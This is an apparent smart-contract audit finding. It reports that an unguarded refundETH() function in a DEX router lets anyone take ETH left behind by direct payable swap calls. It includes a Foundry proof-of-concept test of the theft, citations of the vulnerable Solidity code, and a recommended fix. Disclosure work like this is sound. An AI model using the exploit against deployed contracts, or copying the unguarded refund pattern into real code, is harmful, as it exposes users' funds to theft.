Audit Report

## Title
Unguarded `refundETH()` Enables Theft of ETH Stranded by Direct Payable Swap Calls — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`refundETH()` transfers the router's entire ETH balance to `msg.sender` with no access control. When a user calls a `payable` swap function (e.g., `exactOutputSingle`) directly with excess `msg.value`, the `pay()` function wraps only the exact swap amount into WETH and leaves the remainder as raw ETH in the router after the transaction. Any subsequent caller can invoke `refundETH()` to steal that stranded ETH.

## Finding Description
`refundETH()` at [1](#0-0)  unconditionally sends `address(this).balance` to `msg.sender` with no caller restriction.

The `receive()` guard at [2](#0-1)  only blocks plain ETH transfers (triggering the fallback). It does not block ETH deposited via `payable` function calls such as `exactOutputSingle{value: X}(...)`, where `msg.value` enters the contract balance through the function's `payable` modifier without invoking `receive()`.

Inside `pay()`, when `token == WETH` and `nativeBalance >= value`, exactly `value` wei is wrapped and forwarded to the pool: [3](#0-2) 

The remainder (`msg.value - actualAmountIn`) is never refunded. Neither `exactOutputSingle` nor `exactInputSingle` contain any post-swap ETH refund: [4](#0-3) 

After the transaction completes, the surplus ETH sits in the router across block boundaries. Any address can then call `refundETH()` in a subsequent transaction to drain it.

## Impact Explanation
Direct loss of user ETH principal. For `exactOutputSingle`, users routinely send a buffer above the expected input because the exact input is unknown before execution. The stolen amount equals `msg.value - actualAmountIn`, which can be arbitrarily large. This meets the Sherlock threshold for a direct loss of user funds.

## Likelihood Explanation
Medium. The intended usage pattern is `multicall{value}([swap, refundETH()])`, which is atomic and safe. However, `exactOutputSingle` and `exactInputSingle` are `external payable` and callable directly. A user calling them directly — a natural pattern — strands ETH. A mempool-watching attacker can call `refundETH()` in any subsequent block. No special privileges are required; any EOA or contract can execute the theft.

## Recommendation
Add an automatic ETH refund at the end of each `payable` swap function: after the swap settles, if `address(this).balance > 0`, transfer it back to `msg.sender`. Alternatively, restrict `refundETH()` to only be callable within a `multicall` context (e.g., by checking `address(this) == implementation` to enforce `delegatecall`-only access). The simplest and most robust fix is to add `if (address(this).balance > 0) _transferETH(msg.sender, address(this).balance);` at the end of `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput`.

## Proof of Concept
```solidity
function test_refundETH_stealsStrandedETH() public {
    address userA = makeAddr("userA");
    address attacker = makeAddr("attacker");
    vm.deal(userA, 2 ether);

    // userA calls exactOutputSingle directly with 2 ETH buffer;
    // pay() wraps only actualAmountIn into WETH; remainder stays in router.
    vm.prank(userA);
    router.exactOutputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactOutputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: 1_000,
            amountInMaximum: 2 ether,
            recipient: userA,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // Surplus ETH is now stranded in the router across transaction boundary.
    assertGt(address(router).balance, 0, "ETH stranded");

    // Attacker steals it in a subsequent transaction.
    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();
    assertGt(attacker.balance, before, "attacker stole userA's ETH");
    assertEq(address(router).balance, 0, "router drained");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L75-77)
```text
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-147)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
    int128 amountOut = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = MetricOmmSwapInputs.int128ToUint128(
      MetricOmmSwapResults.extractAmountIn(params.zeroForOne, amount0Delta, amount1Delta)
    );

    if (amountIn > params.amountInMaximum) revert InputTooHigh(amountIn, params.amountInMaximum);
    _clearExpectedCallbackPool();
  }
```
